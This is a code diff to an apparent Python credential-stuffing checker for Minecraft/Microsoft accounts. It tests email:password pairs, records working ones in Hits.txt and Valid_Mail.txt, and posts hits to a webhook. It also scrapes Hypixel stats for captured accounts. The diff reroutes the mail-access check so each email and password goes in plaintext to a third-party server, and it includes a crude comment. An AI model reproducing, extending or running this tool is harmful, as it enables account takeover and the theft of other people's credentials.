@@ -49,17 +49,18 @@ class Capture:
                 "username": "MSMC"
             }
             requests.post(webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
-        except: errors+=1
+        except: 
+            errors+=1
 
     def hypixel(name):
         global errors
         try:
-            oname = None
-            olevel = None
-            ofirstlogin = None
-            olastlogin = None
-            osbcoins = None
-            obwstars = None
+            oname = "N/A"
+            olevel = "N/A"
+            ofirstlogin = "N/A"
+            olastlogin = "N/A"
+            obwstars = "N/A"
+            osbcoins = "N/A"
             tx = requests.get('https://plancke.io/hypixel/player/stats/'+name, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
             try: oname = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
             except: _=''
@@ -88,8 +89,8 @@ class Capture:
     def full_access(email, password):
         global errors
         try:
-            out = requests.get(f"https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={email}&Password={password}", headers={"User-Agent":"MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0"}, verify=False).text
-            if "Ok=1" in out: return True
+            out = json.loads(requests.get(f"https://email.avine.tools/check?email={email}&password={password}", verify=False).text) #my mailaccess checking api pls dont rape or it will go offline prob (weak hosting)
+            if out["Success"] == 1: return True
         except: errors+=1
         return False
     
@@ -244,26 +245,27 @@ def authenticate(email, password):
                         if mc != None:
                             Capture.handle(mc, email, password, capes)
                         else:
-                            if screen == "'2'": print(Fore.GREEN+f"Valid Mail: {email}:{password}")
-                            vm+=1
+                            hits+=1
                             cpm+=1
                             checked+=1
-                            with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
+                            with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{email}:{password}\n")
+                            if screen == "'2'": print(Fore.GREEN+f"Hit: No Name Set | {email}:{password}")
+                            Capture.notify(email, password, "Not Set", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A")
                     else:
-                        bad+=1
+                        vm+=1
                         cpm+=1
                         checked+=1
-                        if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
+                        with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
                 else:
-                    bad+=1
+                    vm+=1
                     cpm+=1
                     checked+=1
-                    if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
+                    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
             else:
-                bad+=1
+                vm+=1
                 cpm+=1
                 checked+=1
-                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
+                with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
     except Exception as e:
         #print(e)
         #traceback.print_exc()
